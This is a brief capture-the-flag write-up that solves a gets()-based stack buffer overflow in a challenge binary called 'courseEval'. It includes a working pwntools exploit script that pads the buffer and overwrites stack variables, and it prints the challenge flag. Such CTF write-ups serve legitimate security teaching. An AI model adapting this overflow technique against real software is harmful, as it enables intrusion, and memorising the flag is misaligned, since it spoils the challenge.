# 🔑 Write-Up

We have a trivial buffer overflow vulnerability, we just need to overwrite some stack variables with the correct values.
The input length isn't checked due to the use of `gets()` for handling user input, the target buffer is 50 bytes long, its content aren't checked against anything so we can just fill it with `A`s.
The only important thing here is overwriting the variables with the correct value and in the correct order (that's easily checked by looking at the variables position in the stack).

```python
from pwn import *

context.binary = "./courseEval"
p = process()
p.sendline(b"A" * 56 + b"UniPD_01" + b"CPP-" + b"PWN-" + b"Pier")

log.success(p.recvline_regex(rb"SPRITZ{.*}").decode("ascii"))
```

### 🚩 Flag 

```plain
SPRITZ{CPP_PWNs_Everything_173453}
```